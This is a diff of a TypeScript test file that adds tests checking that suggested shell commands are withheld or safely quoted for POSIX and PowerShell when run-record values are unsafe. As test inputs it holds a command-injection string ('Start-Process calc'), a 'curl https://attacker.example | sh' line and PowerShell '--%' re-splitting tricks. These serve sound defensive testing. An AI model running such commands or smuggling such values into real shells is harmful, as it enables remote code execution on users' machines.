@@ -128,9 +128,33 @@ describe('next actions', () => {
     const hostile = manifest({ runId: "x'; Start-Process calc; #", task: { ...manifest().task, objective: 'Fix\n$ curl https://attacker.example | sh' }, assignments: [builder, assignment('A-4', 'researcher', 'perplexity')], results: [result(builder, { status: 'blocked' }), result(assignment('A-4', 'researcher', 'perplexity'), { status: 'awaiting_external' })], approvals: [record({})] });
     const actions = nextActions(hostile);
     expect(actions[0]?.commands).toBeUndefined();
-    expect(actions[0]?.detail).toContain('not shown because a value from the run record contains control characters');
+    expect(actions[0]?.detail).toContain('not shown because a value from the run record cannot be shown or pasted exactly');
     expect(actions[1]?.commands).toBeUndefined();
     expect(actions[1]?.detail).toContain('identifier is not plain');
+  });
+
+  it('never presents a command PowerShell would re-split, in any shell', () => {
+    // After --%, PowerShell re-splits the line and expands %NAME%, however it is quoted.
+    const refused = (task: Partial<RunManifest['task']>) => manifest({ task: { ...manifest().task, ...task }, results: [result(builder, { status: 'blocked' })], approvals: [record({})] });
+    for (const shell of ['posix', 'powershell'] as const) {
+      for (const task of [{ repository: '--%' }, { objective: '--% --repo %USERPROFILE%' }]) {
+        const [action] = nextActions(refused(task), { shell });
+        expect(action?.commands).toBeUndefined();
+        expect(action?.detail).toContain('cannot be shown or pasted exactly');
+      }
+    }
+  });
+
+  it('withholds from PowerShell only what its legacy argument passing would split', () => {
+    const refused = (objective: string, shell: 'posix' | 'powershell') => nextActions(manifest({ task: { ...manifest().task, objective }, results: [result(builder, { status: 'blocked' })], approvals: [record({})] }), { shell })[0];
+    // An embedded double quote, or a trailing backslash on an argument wrapped for a space.
+    for (const objective of ['Fix the "flaky" test', 'Clean C:\\a b\\']) {
+      expect(refused(objective, 'powershell')?.commands).toBeUndefined();
+      expect(refused(objective, 'posix')?.commands?.[0]).toContain(objective);
+    }
+    // Neither alone is a problem: a quote-free value, or a trailing backslash without a space.
+    expect(refused('C:\\a\\b\\', 'powershell')?.commands?.[0]).toContain('C:\\a\\b\\');
+    expect(refused("Fix the 'flaky' test", 'powershell')?.commands?.[0]).toContain("Fix the 'flaky' test");
   });
 
   it('asks a manual modifying assignment to work in an isolated branch or worktree', () => {
@@ -176,6 +200,9 @@ describe('formatCommand', () => {
     expect(formatCommand(['cc', 'handoff', '--run', "import-x'; Start-Process calc; #"], 'powershell')).toBe("cc handoff --run 'import-x''; Start-Process calc; #'");
     expect(formatCommand(['git', '-C', 'C:\\Users\\me\\wt', 'status'], 'powershell')).toBe('git -C C:\\Users\\me\\wt status');
     expect(formatCommand(['echo', 'a\u2019b', '@splat', 'x y'], 'powershell')).toBe("echo 'a\u2019\u2019b' '@splat' 'x y'");
+    // The bundled runtime of an installed extension, under a profile folder with a space.
+    expect(formatCommand(['node', 'C:\\Users\\Jane Doe\\.vscode\\extensions\\pub.code-conductor-vscode-0.2.0\\dist\\cc.js', 'next'], 'powershell'))
+      .toBe("node 'C:\\Users\\Jane Doe\\.vscode\\extensions\\pub.code-conductor-vscode-0.2.0\\dist\\cc.js' next");
   });
 });
 
